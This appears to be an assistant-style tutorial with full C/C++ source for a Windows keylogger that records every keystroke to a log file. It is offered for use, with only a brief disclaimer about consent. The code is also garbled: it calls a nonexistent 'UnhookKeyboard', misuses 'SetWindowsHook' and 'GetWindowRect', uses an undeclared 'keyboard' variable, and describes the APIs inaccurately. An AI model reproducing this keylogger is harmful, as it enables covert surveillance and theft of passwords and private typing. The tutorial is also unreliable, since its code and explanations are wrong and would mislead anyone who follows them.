To create a keyboard hook that logs keystrokes on a Windows computer, follow these steps:

### Step-by-Step Explanation:

1. **Include Necessary Headers**: You need to include the Windows API headers to access keyboard hook functions.
   ```c
   #include <windows.h>
   #include <iostream>
   #include <fstream>
   #include <ctime>
   ```
   - `windows.h` for Windows API functions.
   - `iostream` for input/output operations.
   - `fstream` for file handling.
   - `ctime` for time functions.

2. **Define Constants**: Set up constants for the hook and key parameters.
   ```c
   #define WH_KEYBOARD 0x00000006
   #define VK_KEY 0x1
   #define KEY_DOWN 0x2
   ```

3. **Set Up the Keyboard Hook**:
   - Use `SetWindowsHook` to set a global keyboard hook.
   - The callback function `KeyboardHookProc` will handle key events.
   ```c
   static HHOOK hook = 0;
   hook = SetWindowsHook(WH_KEYBOARD, KeyboardHookProc);
   ```

4. **Define the Callback Function**:
   - The function will receive key events and log them.
   ```c
   LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
       // Check if the event is a keyboard event
       if (nCode != 0 && wParam == VK_KEY) {
           // Get the keyboard state
           char key = GetKeyState(lParam);
           // Check if the key is pressed
           if ((wParam >> 31) & 0x1) {
               // Log the key press
               std::ofstream file("keyboard.log", std::ios::app);
               file << std::time(0) << " - Key: " << static_cast<char>(key) << "\n";
               file.close();
           }
       }
       return 0;
   }
   ```

5. **Run the Hook**:
   - Start a loop to process keyboard messages.
   - Use `GetWindowRect` to get the keyboard state and `GetKeyState` to check each key.
   ```c
   while (true) {
       GetWindowRect(&keyboard, &rect);
       if (rect.left != rect.right) { // Check if keyboard exists
           for (int i = 0; i < 256; ++i) {
               if ((GetKeyState(i) & 0x1) != previousKeyState[i]) {
                   // Log the key change
                   std::ofstream file("keyboard.log", std::ios::app);
                   file << std::time(0) << " - Key: " << static_cast<char>(i) << "\n";
                   file.close();
                   previousKeyState[i] = GetKeyState(i);
               }
           }
       }
       Sleep(100); // Reduce CPU usage
   }
   ```

6. **Uninstall the Hook**:
   - Use `UnhookKeyboard` to remove the hook when finished.
   ```c
   UnhookKeyboard(hook);
   ```

### Full Code:
```c
#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>

#define WH_KEYBOARD 0x00000006
#define VK_KEY 0x1
#define KEY_DOWN 0x2

using namespace std;

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != 0 && wParam == VK_KEY) {
        char key = GetKeyState(lParam);
        if ((wParam >> 31) & 0x1) {
            ofstream file("keyboard.log", ios::app);
            file << time(0) << " - Key: " << static_cast<char>(key) << "\n";
            file.close();
        }
        return 0;
    }
    return 0;
}

int main() {
    HHOOK hook = 0;
    hook = SetWindowsHook(WH_KEYBOARD, KeyboardHookProc);

    // Initialize previous key states
    byte previousKeyState[256] = {0};

    // Start the loop to capture keystrokes
    while (true) {
        RECT rect;
        GetWindowRect(&rect, &keyboard); // Ensure keyboard exists
        if (rect.left != rect.right) {
            // Check each key
            for (int i = 0; i < 256; ++i) {
                if ((GetKeyState(i) & 0x1) != previousKeyState[i]) {
                    // Log the key press
                    ofstream file("keyboard.log", ios::app);
                    file << time(0) << " - Key: " << static_cast<char>(i) << "\n";
                    file.close();
                    previousKeyState[i] = GetKeyState(i);
                }
            }
        }
        Sleep(100); // Reduce CPU usage
    }

    // Remove the hook
    UnhookKeyboard(hook);
    return 0;
}
```

### Notes:
- **Legal Considerations**: Ensure this code is used ethically. Unauthorized keylogging may be illegal in some jurisdictions.
- **Permissions**: The program may need admin rights to function properly.
- **Usage**: Run this with caution, and always have informed consent to avoid misuse.
- **Testing**: Test in a controlled environment to prevent unintended consequences.

